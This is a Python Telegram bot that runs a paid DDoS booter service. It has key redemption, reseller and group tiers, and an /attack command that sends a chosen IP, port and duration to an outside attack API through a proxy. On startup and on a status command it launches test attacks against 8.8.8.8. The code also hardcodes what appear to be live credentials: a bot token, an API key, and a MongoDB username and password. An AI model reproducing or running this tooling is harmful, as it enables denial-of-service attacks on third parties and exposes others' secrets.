#!/usr/bin/env python3
import telebot
import requests
import time
import threading
import json
import os
import random
import string
import re
from datetime import datetime, timedelta, timezone
from pymongo import MongoClient

# ========== TIMEZONE (IST) ==========
IST = timezone(timedelta(hours=5, minutes=30))

def get_current_ist():
    return datetime.now(IST)

def time_format():
    return get_current_ist().strftime('%d %b %Y, %I:%M:%S %p')

# ========== CONFIG ==========
BOT_TOKEN = "8411767969:AAHGoJ59mabo9WsHHqlg3J2JFOV3YJGdVbg"
ADMIN_IDS = ["7192516189", "8487946379"]
API_URL = "https://app.teamc2.xyz/api/attack"
API_KEY = "9K6EAS"
PROXY_URL = "http://37.114.46.10:8888"
MAX_CONCURRENT = 2
COOLDOWN_TIME = 30

# ========== MONGODB ==========
MONGO_URI = "mongodb+srv://mohitrao83076_db_user:LugF1xwlenkWRE1F@monster.ydmmckl.mongodb.net/?retryWrites=true&w=majority&appName=MONSTER"
client = MongoClient(MONGO_URI)
db = client["xsilent_bot"]

users_collection = db["users"]
keys_collection = db["keys"]
groups_collection = db["groups"]
hosted_bots_collection = db["hosted_bots"]
settings_collection = db["settings"]
broadcast_collection = db["broadcast"]

print("✅ MongoDB Connected!")

# ========== PROXY SETUP ==========
proxies = {
    "http": PROXY_URL,
    "https": PROXY_URL
}

def send_api_with_proxy(ip, port, dur, cid, bot_obj):
    try:
        params = {
            "api_key": API_KEY,
            "target": ip,
            "port": port,
            "time": dur,
            "concurrent": 1
        }
        
        # With Proxy
        resp = requests.get(API_URL, params=params, proxies=proxies, timeout=15)
        
        if resp.status_code == 200:
            time.sleep(dur)
            bot_obj.send_message(cid, f"✅ ATTACK FINISHED!\n🎯 {ip}:{port}\n⏱️ {dur}s\n📅 {time_format()}")
            return True
        else:
            bot_obj.send_message(cid, f"❌ Attack failed! Status: {resp.status_code}")
            return False
    except Exception as e:
        bot_obj.send_message(cid, f"❌ API error: {str(e)[:50]}")
        return False

# ========== LOAD DATA ==========
def load_users():
    data = users_collection.find_one({"_id": "main"})
    if not data:
        data = {"users": ADMIN_IDS, "resellers": []}
        users_collection.insert_one({"_id": "main", **data})
    return data

def save_users(data):
    users_collection.update_one({"_id": "main"}, {"$set": data})

def load_keys():
    keys = {}
    for doc in keys_collection.find():
        keys[doc["key"]] = doc
        del keys[doc["key"]]["_id"]
    return keys

def save_keys(data):
    keys_collection.delete_many({})
    for k, v in data.items():
        v["key"] = k
        keys_collection.insert_one(v)

def load_groups():
    groups = {}
    for doc in groups_collection.find():
        groups[doc["group_id"]] = doc
        del groups[doc["group_id"]]["_id"]
    return groups

def save_groups(data):
    groups_collection.delete_many({})
    for gid, info in data.items():
        info["group_id"] = gid
        groups_collection.insert_one(info)

def load_hosted():
    bots = {}
    for doc in hosted_bots_collection.find():
        bots[doc["bot_token"]] = doc
        del bots[doc["bot_token"]]["_id"]
        bots[doc["bot_token"]]["active_attacks"] = {}
    return bots

def save_hosted(data):
    hosted_bots_collection.delete_many({})
    for token, info in data.items():
        copy = {k: v for k, v in info.items() if k != "active_attacks"}
        copy["bot_token"] = token
        hosted_bots_collection.insert_one(copy)

def load_settings():
    data = settings_collection.find_one({"_id": "main"})
    if not data:
        data = {"max_concurrent": 2, "cooldown": 30}
        settings_collection.insert_one({"_id": "main", **data})
    return data

def save_settings(data):
    settings_collection.update_one({"_id": "main"}, {"$set": data})

def load_broadcast():
    data = broadcast_collection.find_one({"_id": "main"})
    if not data:
        data = {"users": []}
        broadcast_collection.insert_one({"_id": "main", **data})
    return data

def save_broadcast(data):
    broadcast_collection.update_one({"_id": "main"}, {"$set": data})

# ========== INIT ==========
users_data = load_users()
users = users_data["users"]
resellers = users_data.get("resellers", [])
keys_data = load_keys()
groups = load_groups()
hosted_bots = load_hosted()
settings = load_settings()
broadcast_data = load_broadcast()
broadcast_users = broadcast_data.get("users", [])

MAX_CONCURRENT = settings.get("max_concurrent", 2)
COOLDOWN_TIME = settings.get("cooldown", 30)

bot = telebot.TeleBot(BOT_TOKEN)

# ========== GLOBALS ==========
active_attacks = {}
cooldown = {}
hosted_instances = {}
maintenance = False

# ========== HELPERS ==========
def gen_key(prefix=""):
    rand = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return f"{prefix}-{rand}" if prefix else rand

def parse_dur(txt):
    txt = txt.lower()
    if txt.isdigit():
        return int(txt), "day"
    if txt.endswith('h') and txt[:-1].isdigit():
        return int(txt[:-1]), "hour"
    return None, None

def get_expiry(val, unit):
    now = get_current_ist()
    if unit == "hour":
        return now + timedelta(hours=val)
    return now + timedelta(days=val)

def fmt_dur(val, unit):
    return f"{val} Hour(s)" if unit == "hour" else f"{val} Day(s)"

def total_active():
    now = time.time()
    for aid in list(active_attacks.keys()):
        if now >= active_attacks[aid]["finish"]:
            del active_attacks[aid]
    for bot in hosted_bots.values():
        for aid in list(bot.get("active_attacks", {}).keys()):
            if now >= bot["active_attacks"][aid]["finish"]:
                del bot["active_attacks"][aid]
                save_hosted(hosted_bots)
    return len(active_attacks) + sum(len(b.get("active_attacks", {})) for b in hosted_bots.values())

def check_expiry(uid):
    now = time.time()
    for info in keys_data.values():
        if info.get("used_by") == uid and info.get("used") and now < info["expires_at"]:
            return True
    return False

def valid_ip(ip):
    p = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(p, ip):
        return all(0 <= int(x) <= 255 for x in ip.split('.'))
    return False

def valid_port(p):
    return 1 <= p <= 65535

# ========== CLEANUP ==========
def clean_keys():
    while True:
        time.sleep(60)
        now = time.time()
        expired = []
        for k, v in keys_data.items():
            if v.get("used") and now > v["expires_at"]:
                expired.append(k)
        for k in expired:
            uid = keys_data[k].get("used_by")
            if uid and uid not in ADMIN_IDS:
                has_other = any(v.get("used_by") == uid and v.get("used") and kk != k and now < v["expires_at"] for kk, v in keys_data.items())
                if not has_other and uid in users:
                    users.remove(uid)
                    users_data["users"] = users
                    save_users(users_data)
                    try:
                        bot.send_message(uid, "⚠️ Your access has expired!")
                    except:
                        pass
            del keys_data[k]
        if expired:
            save_keys(keys_data)

threading.Thread(target=clean_keys, daemon=True).start()

def clean_attacks():
    while True:
        time.sleep(5)
        now = time.time()
        for aid in list(active_attacks.keys()):
            if now >= active_attacks[aid]["finish"]:
                del active_attacks[aid]
        for bot in hosted_bots.values():
            changed = False
            for aid in list(bot.get("active_attacks", {}).keys()):
                if now >= bot["active_attacks"][aid]["finish"]:
                    del bot["active_attacks"][aid]
                    changed = True
            if changed:
                save_hosted(hosted_bots)

threading.Thread(target=clean_attacks, daemon=True).start()

# ========== TEST API CONNECTION ==========
def test_api():
    try:
        params = {"api_key": API_KEY, "target": "8.8.8.8", "port": "80", "time": "2", "concurrent": 1}
        resp = requests.get(API_URL, params=params, proxies=proxies, timeout=10)
        print(f"API Test Response: {resp.status_code}")
        return resp.status_code == 200
    except Exception as e:
        print(f"API Test Failed: {e}")
        return False

test_api()

# ========== MAIN BOT COMMANDS ==========
@bot.message_handler(commands=['start'])
def start(m):
    uid = str(m.chat.id)
    if uid not in broadcast_users:
        broadcast_users.append(uid)
        save_broadcast({"users": broadcast_users})
    if uid not in users and uid not in ADMIN_IDS:
        users.append(uid)
        users_data["users"] = users
        save_users(users_data)
    
    if maintenance:
        bot.reply_to(m, "🔧 Maintenance mode")
        return
    
    if m.chat.type in ["group", "supergroup"]:
        gid = str(m.chat.id)
        if gid in groups:
            bot.reply_to(m, f"✨ GROUP ACTIVE\n⚡ Max: {groups[gid]['attack_time']}s\nCommands: /attack IP PORT, /status, /help")
        else:
            bot.reply_to(m, "❌ Group not approved")
        return
    
    if uid in ADMIN_IDS:
        bot.reply_to(m, f"""👑 OWNER PANEL

✅ Full Access
⚡ Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s
📅 {time_format()}

📝 COMMANDS:

⚔️ ATTACK:
/attack IP PORT TIME
/status
/cooldown
/second 10-300

🔑 KEYS:
/genkey 1 or 5h
/trialkey prefix 1h 10
/removekey KEY

👥 USERS:
/add USER_ID
/remove USER_ID
/addreseller USER_ID
/removereseller USER_ID

👥 GROUPS:
/addgroup GROUP_ID SECONDS
/removegroup GROUP_ID
/allgroups

🤖 HOST BOT:
/host TOKEN OWNER_ID CONCURRENT NAME
/unhost TOKEN
/allhosts

🔧 OTHER:
/maintenance on/off
/broadcast
/stopattack IP:PORT
/allusers
/api_status

🛒 Buy: Contact Owner""")
    
    elif uid in resellers:
        bot.reply_to(m, f"""💎 RESELLER PANEL

✅ Reseller Access
⚡ Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s
📅 {time_format()}

📝 COMMANDS:
/attack IP PORT TIME
/status
/cooldown
/genkey 1 or 5h
/mykeys

🛒 Buy: Contact Owner""")
    
    elif uid in users:
        active = check_expiry(uid)
        bot.reply_to(m, f"""🔥 USER PANEL

✅ Status: {'ACTIVE' if active else 'EXPIRED'}
⚡ Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s
📅 {time_format()}

📝 COMMANDS:
/attack IP PORT TIME
/redeem KEY
/status
/mykeys
/cooldown
/help

🛒 Buy: Contact Owner""")
    
    else:
        bot.reply_to(m, f"❌ Unauthorized\nUse /redeem KEY to activate\n📅 {time_format()}")

@bot.message_handler(commands=['help'])
def help_cmd(m):
    uid = str(m.chat.id)
    if m.chat.type in ["group", "supergroup"]:
        bot.reply_to(m, "Commands: /attack IP PORT, /status, /help")
        return
    if uid in ADMIN_IDS:
        bot.reply_to(m, "👑 Owner: /attack, /status, /cooldown, /second, /genkey, /trialkey, /removekey, /add, /remove, /addreseller, /removereseller, /addgroup, /removegroup, /host, /unhost, /maintenance, /broadcast, /stopattack, /allusers, /allgroups, /allhosts, /api_status")
    elif uid in resellers:
        bot.reply_to(m, "💎 Reseller: /attack, /status, /cooldown, /genkey, /mykeys")
    elif uid in users:
        bot.reply_to(m, "🔥 User: /attack IP PORT TIME, /redeem KEY, /status, /mykeys, /cooldown")
    else:
        bot.reply_to(m, "❌ Use /redeem KEY to activate")

@bot.message_handler(commands=['cooldown'])
def cooldown_cmd(m):
    uid = str(m.chat.id)
    if uid in cooldown:
        rem = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if rem > 0:
            bot.reply_to(m, f"⏳ Cooldown: {int(rem)}s")
            return
        del cooldown[uid]
    bot.reply_to(m, "✅ No cooldown")

@bot.message_handler(commands=['second'])
def second_cmd(m):
    uid = str(m.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(m, "❌ Owner only!")
        return
    args = m.text.split()
    if len(args) != 2:
        bot.reply_to(m, "Usage: /second 10-300")
        return
    try:
        val = int(args[1])
        if val < 10 or val > 300:
            bot.reply_to(m, "❌ Must be 10-300 seconds")
            return
        global MAX_CONCURRENT
        MAX_CONCURRENT = val
        settings["max_concurrent"] = val
        save_settings(settings)
        bot.reply_to(m, f"✅ Max concurrent set to {val}")
    except:
        bot.reply_to(m, "❌ Invalid number")

@bot.message_handler(commands=['attack'])
def attack_cmd(m):
    uid = str(m.chat.id)
    is_group = m.chat.type in ["group", "supergroup"]
    
    if is_group:
        gid = str(m.chat.id)
        if gid not in groups:
            bot.reply_to(m, "❌ Group not approved")
            return
        max_t = groups[gid]["attack_time"]
        args = m.text.split()
        if len(args) != 3:
            bot.reply_to(m, "Usage: /attack IP PORT")
            return
        ip, port = args[1], args[2]
        try:
            port = int(port)
            dur = max_t
        except:
            bot.reply_to(m, "❌ Invalid port")
            return
        if not valid_port(port):
            bot.reply_to(m, f"❌ Port 1-65535 only")
            return
    else:
        if uid not in users or not check_expiry(uid):
            bot.reply_to(m, "❌ No active key. Use /redeem KEY")
            return
        args = m.text.split()
        if len(args) != 4:
            bot.reply_to(m, "Usage: /attack IP PORT TIME\nExample: /attack 1.1.1.1 443 60")
            return
        ip, port, d = args[1], args[2], args[3]
        try:
            port = int(port)
            dur = int(d)
        except:
            bot.reply_to(m, "❌ Invalid")
            return
        if not valid_port(port):
            bot.reply_to(m, f"❌ Port 1-65535 only")
            return
        if dur < 10 or dur > 300:
            bot.reply_to(m, "❌ Duration 10-300 seconds")
            return
        if uid in cooldown:
            rem = COOLDOWN_TIME - (time.time() - cooldown[uid])
            if rem > 0:
                bot.reply_to(m, f"⏳ Wait {int(rem)}s")
                return
    
    if not valid_ip(ip):
        bot.reply_to(m, "❌ Invalid IP")
        return
    
    if total_active() >= MAX_CONCURRENT:
        bot.reply_to(m, f"❌ Global limit {MAX_CONCURRENT} reached")
        return
    
    target_key = f"{ip}:{port}"
    now = time.time()
    for a in active_attacks.values():
        if a["target"] == target_key and now < a["finish"]:
            bot.reply_to(m, f"❌ Target under attack")
            return
    
    if not is_group:
        cooldown[uid] = now
    
    aid = f"{uid}_{int(now)}_{random.randint(1000,9999)}"
    active_attacks[aid] = {"user": uid, "finish": now + dur, "ip": ip, "port": port, "target": target_key}
    
    bot.reply_to(m, f"✨ ATTACK LAUNCHED!\n🎯 {ip}:{port}\n⏱️ {dur}s\n🌐 Active: {total_active()}/{MAX_CONCURRENT}")
    
    def run():
        send_api_with_proxy(ip, port, dur, m.chat.id, bot)
        if aid in active_attacks:
            del active_attacks[aid]
    threading.Thread(target=run).start()

@bot.message_handler(commands=['status'])
def status_cmd(m):
    uid = str(m.chat.id)
    if uid not in users and uid not in ADMIN_IDS and uid not in resellers:
        bot.reply_to(m, "❌ Unauthorized")
        return
    
    now = time.time()
    slots = []
    for a in active_attacks.values():
        if now < a["finish"]:
            rem = int(a["finish"] - now)
            slots.append(f"🎯 {a['target']} 👤 {a['user']} ⏰ {rem}s")
    
    txt = "📊 ATTACK STATUS\n\n"
    if slots:
        for i, s in enumerate(slots):
            txt += f"🔴 SLOT {i+1}: BUSY\n    {s}\n\n"
    else:
        txt += "✅ ALL SLOTS FREE\n\n"
    txt += f"📊 Main Active: {len(active_attacks)}/{MAX_CONCURRENT}\n"
    txt += f"🌐 Total Global: {total_active()}/{MAX_CONCURRENT}\n"
    txt += f"📅 {time_format()}"
    
    bot.reply_to(m, txt)

@bot.message_handler(commands=['redeem'])
def redeem_cmd(m):
    uid = str(m.chat.id)
    args = m.text.split()
    if len(args) != 2:
        bot.reply_to(m, "Usage: /redeem KEY")
        return
    key = args[1]
    if key not in keys_data:
        bot.reply_to(m, "❌ Invalid key")
        return
    info = keys_data[key]
    if info.get("used"):
        bot.reply_to(m, "❌ Already used")
        return
    if time.time() > info["expires_at"]:
        bot.reply_to(m, "❌ Expired")
        del keys_data[key]
        save_keys(keys_data)
        return
    if uid not in users:
        users.append(uid)
        users_data["users"] = users
        save_users(users_data)
    info["used"] = True
    info["used_by"] = uid
    save_keys(keys_data)
    exp = datetime.fromtimestamp(info["expires_at"]).strftime('%d %b %Y, %I:%M %p')
    bot.reply_to(m, f"✅ ACCESS GRANTED!\n🎉 {fmt_dur(info['duration_value'], info['duration_unit'])}\n📅 Expires: {exp}\n⚡ Max Concurrent: {MAX_CONCURRENT}")

@bot.message_handler(commands=['mykeys'])
def mykeys_cmd(m):
    uid = str(m.chat.id)
    if uid not in ADMIN_IDS and uid not in resellers:
        bot.reply_to(m, "❌ Unauthorized")
        return
    my = []
    for k, v in keys_data.items():
        if v.get("generated_by") == uid and not v.get("used"):
            exp = datetime.fromtimestamp(v["expires_at"]).strftime('%d %b %Y')
            my.append(f"🔑 {k}\n   {fmt_dur(v['duration_value'], v['duration_unit'])}\n   📅 {exp}")
    if my:
        bot.reply_to(m, "📋 YOUR KEYS:\n\n" + "\n\n".join(my))
    else:
        bot.reply_to(m, "📋 No keys found")

@bot.message_handler(commands=['genkey'])
def genkey_cmd(m):
    uid = str(m.chat.id)
    if uid not in ADMIN_IDS and uid not in resellers:
        bot.reply_to(m, "❌ Unauthorized")
        return
    args = m.text.split()
    if len(args) != 2:
        bot.reply_to(m, "Usage: /genkey 1 or /genkey 5h")
        return
    val, unit = parse_dur(args[1])
    if not val:
        bot.reply_to(m, "❌ Invalid")
        return
    key = gen_key()
    exp = get_expiry(val, unit)
    keys_data[key] = {"duration_value": val, "duration_unit": unit, "generated_by": uid, "generated_at": time.time(), "expires_at": exp.timestamp(), "used": False}
    save_keys(keys_data)
    bot.reply_to(m, f"✅ KEY GENERATED!\n🔑 {key}\n⏰ {fmt_dur(val, unit)}\n📅 Expires: {exp.strftime('%d %b %Y, %I:%M %p')}\n\n/redeem {key}")

@bot.message_handler(commands=['trialkey'])
def trialkey_cmd(m):
    uid = str(m.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(m, "❌ Owner only")
        return
    args = m.text.split()
    if len(args) != 4:
        bot.reply_to(m, "Usage: /trialkey prefix 1h 10")
        return
    prefix, dur_str, qty_str = args[1], args[2], args[3]
    val, unit = parse_dur(dur_str)
    if not val:
        bot.reply_to(m, "❌ Invalid duration")
        return
    try:
        qty = int(qty_str)
        if qty < 1 or qty > 100:
            bot.reply_to(m, "❌ Quantity 1-100")
            return
    except:
        bot.reply_to(m, "❌ Invalid quantity")
        return
    keys_list = []
    for _ in range(qty):
        key = gen_key(prefix)
        exp = get_expiry(val, unit)
        keys_data[key] = {"duration_value": val, "duration_unit": unit, "generated_by": uid, "generated_at": time.time(), "expires_at": exp.timestamp(), "used": False}
        keys_list.append(key)
    save_keys(keys_data)
    bot.reply_to(m, f"✅ {qty} KEYS GENERATED!\n🔑 {', '.join(keys_list)}\n⏰ {fmt_dur(val, unit)}")

@bot.message_handler(commands=['removekey'])
def removekey_cmd(m):
    uid = str(m.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(m, "❌ Owner only")
        return
    args = m.text.split()
    if len(args) != 2:
        bot.reply_to(m, "Usage: /removekey KEY")
        return
    key = args[1]
    if key in keys_data:
        del keys_data[key]
        save_keys(keys_data)
        bot.reply_to(m, f"✅ Key removed")
    else:
        bot.reply_to(m, "❌ Key not found")

@bot.message_handler(commands=['add'])
def add_user_cmd(m):
    uid = str(m.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(m, "❌ Owner only")
        return
    args = m.text.split()
    if len(args) != 2:
        bot.reply_to(m, "Usage: /add USER_ID")
        return
    nu = args[1]
    if nu in users:
        bot.reply_to(m, "❌ Already exists")
        return
    users.append(nu)
    users_data["users"] = users
    save_users(users_data)
    bot.reply_to(m, f"✅ User {nu} added")

@bot.message_handler(commands=['remove'])
def remove_user_cmd(m):
    uid = str(m.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(m, "❌ Owner only")
        return
    args = m.text.split()
    if len(args) != 2:
        bot.reply_to(m, "Usage: /remove USER_ID")
        return
    ru = args[1]
    if ru in users:
        users.remove(ru)
        users_data["users"] = users
        save_users(users_data)
        bot.reply_to(m, f"✅ User {ru} removed")
    else:
        bot.reply_to(m, "❌ Not found")

@bot.message_handler(commands=['addreseller'])
def add_reseller_cmd(m):
    uid = str(m.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(m, "❌ Owner only")
        return
    args = m.text.split()
    if len(args) != 2:
        bot.reply_to(m, "Usage: /addreseller USER_ID")
        return
    rid = args[1]
    if rid in resellers:
        bot.reply_to(m, "❌ Already reseller")
        return
    resellers.append(rid)
    if rid not in users:
        users.append(rid)
    users_data["users"] = users
    users_data["resellers"] = resellers
    save_users(users_data)
    bot.reply_to(m, f"✅ Reseller {rid} added")

@bot.message_handler(commands=['removereseller'])
def remove_reseller_cmd(m):
    uid = str(m.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(m, "❌ Owner only")
        return
    args = m.text.split()
    if len(args) != 2:
        bot.reply_to(m, "Usage: /removereseller USER_ID")
        return
    rid = args[1]
    if rid in resellers:
        resellers.remove(rid)
        users_data["resellers"] = resellers
        save_users(users_data)
        bot.reply_to(m, f"✅ Reseller {rid} removed")
    else:
        bot.reply_to(m, "❌ Not reseller")

@bot.message_handler(commands=['addgroup'])
def addgroup_cmd(m):
    uid = str(m.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(m, "❌ Owner only")
        return
    args = m.text.split()
    if len(args) != 3:
        bot.reply_to(m, "Usage: /addgroup GROUP_ID SECONDS")
        return
    gid, sec = args[1], args[2]
    try:
        sec = int(sec)
        if sec < 10 or sec > 300:
            bot.reply_to(m, "❌ 10-300 seconds")
            return
        groups[gid] = {"attack_time": sec, "added_by": uid, "added_at": time.time()}
        save_groups(groups)
        bot.reply_to(m, f"✅ Group {gid} added with {sec}s")
    except:
        bot.reply_to(m, "❌ Invalid")

@bot.message_handler(commands=['removegroup'])
def removegroup_cmd(m):
    uid = str(m.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(m, "❌ Owner only")
        return
    args = m.text.split()
    if len(args) != 2:
        bot.reply_to(m, "Usage: /removegroup GROUP_ID")
        return
    gid = args[1]
    if gid in groups:
        del groups[gid]
        save_groups(groups)
        bot.reply_to(m, f"✅ Group {gid} removed")
    else:
        bot.reply_to(m, "❌ Not found")

@bot.message_handler(commands=['allgroups'])
def allgroups_cmd(m):
    if str(m.chat.id) not in ADMIN_IDS:
        bot.reply_to(m, "❌ Owner only")
        return
    if not groups:
        bot.reply_to(m, "📋 No groups")
        return
    txt = "📋 ALL GROUPS:\n\n"
    for gid, info in groups.items():
        txt += f"👥 {gid}\n   ⏱️ {info['attack_time']}s\n   👑 {info['added_by']}\n\n"
    bot.reply_to(m, txt)

@bot.message_handler(commands=['host'])
def host_bot_cmd(m):
    uid = str(m.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(m, "❌ Owner only")
        return
    args = m.text.split()
    if len(args) != 5:
        bot.reply_to(m, "Usage: /host TOKEN OWNER_ID CONCURRENT NAME")
        return
    token, oid, conc, name = args[1], args[2], args[3], args[4]
    try:
        conc = int(conc)
        if conc < 1 or conc > 20:
            bot.reply_to(m, "❌ Concurrent 1-20")
            return
        hosted_bots[token] = {"owner_id": oid, "owner_name": name, "concurrent": conc, "max_time": 300, "active_attacks": {}, "users": []}
        save_hosted(hosted_bots)
        bot.reply_to(m, f"✅ Hosted bot {name} registered")
    except:
        bot.reply_to(m, "❌ Invalid")

@bot.message_handler(commands=['unhost'])
def unhost_bot_cmd(m):
    uid = str(m.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(m, "❌ Owner only")
        return
    args = m.text.split()
    if len(args) != 2:
        bot.reply_to(m, "Usage: /unhost TOKEN")
        return
    token = args[1]
    if token in hosted_bots:
        del hosted_bots[token]
        save_hosted(hosted_bots)
        bot.reply_to(m, "✅ Hosted bot removed")
    else:
        bot.reply_to(m, "❌ Not found")

@bot.message_handler(commands=['allhosts'])
def allhosts_cmd(m):
    if str(m.chat.id) not in ADMIN_IDS:
        bot.reply_to(m, "❌ Owner only")
        return
    if not hosted_bots:
        bot.reply_to(m, "📋 No hosted bots")
        return
    txt = "📋 HOSTED BOTS:\n\n"
    for token, info in hosted_bots.items():
        txt += f"🔑 {token[:20]}...\n   👑 {info['owner_name']}\n   ⚡ {info['concurrent']}\n\n"
    bot.reply_to(m, txt)

@bot.message_handler(commands=['maintenance'])
def maintenance_cmd(m):
    uid = str(m.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(m, "❌ Owner only")
        return
    args = m.text.split()
    if len(args) != 2 or args[1] not in ['on', 'off']:
        bot.reply_to(m, "Usage: /maintenance on/off")
        return
    global maintenance
    maintenance = args[1] == 'on'
    bot.reply_to(m, f"🔧 Maintenance {'ON' if maintenance else 'OFF'}")

@bot.message_handler(commands=['broadcast'])
def broadcast_cmd(m):
    uid = str(m.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(m, "❌ Owner only")
        return
    if not m.reply_to_message:
        bot.reply_to(m, "Reply to a message to broadcast")
        return
    success = 0
    for user in broadcast_users:
        try:
            bot.copy_message(user, m.chat.id, m.reply_to_message.message_id)
            success += 1
        except:
            pass
    bot.reply_to(m, f"✅ Sent to {success} users")

@bot.message_handler(commands=['stopattack'])
def stopattack_cmd(m):
    uid = str(m.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(m, "❌ Owner only")
        return
    args = m.text.split()
    if len(args) != 2:
        bot.reply_to(m, "Usage: /stopattack IP:PORT")
        return
    target = args[1]
    for aid, info in list(active_attacks.items()):
        if info["target"] == target:
            del active_attacks[aid]
            bot.reply_to(m, f"✅ Stopped {target}")
            return
    bot.reply_to(m, "❌ No active attack on this target")

@bot.message_handler(commands=['allusers'])
def allusers_cmd(m):
    if str(m.chat.id) not in ADMIN_IDS:
        bot.reply_to(m, "❌ Owner only")
        return
    txt = "📋 ALL USERS:\n\n"
    for u in users:
        role = "👑 OWNER" if u in ADMIN_IDS else ("💎 RESELLER" if u in resellers else "👤 USER")
        txt += f"{role}: {u}\n"
    bot.reply_to(m, txt + f"\n📊 Total: {len(users)}")

@bot.message_handler(commands=['api_status'])
def apistatus_cmd(m):
    if str(m.chat.id) not in ADMIN_IDS:
        bot.reply_to(m, "❌ Owner only")
        return
    try:
        params = {"api_key": API_KEY, "target": "8.8.8.8", "port": "80", "time": "1", "concurrent": 1}
        resp = requests.get(API_URL, params=params, proxies=proxies, timeout=5)
        status = "🟢 ONLINE" if resp.status_code == 200 else f"🔴 Error {resp.status_code}"
    except:
        status = "🔴 OFFLINE"
    bot.reply_to(m, f"📡 API: {status}\n🎯 Active: {total_active()}")

# ========== START BOT ==========
print("=" * 50)
print("✨ XSILENT BOT STARTED ✨")
print(f"👑 Owner: {ADMIN_IDS[0]}")
print(f"⚡ Concurrent: {MAX_CONCURRENT}")
print(f"📅 {time_format()}")
print("=" * 50)

bot.infinity_polling()
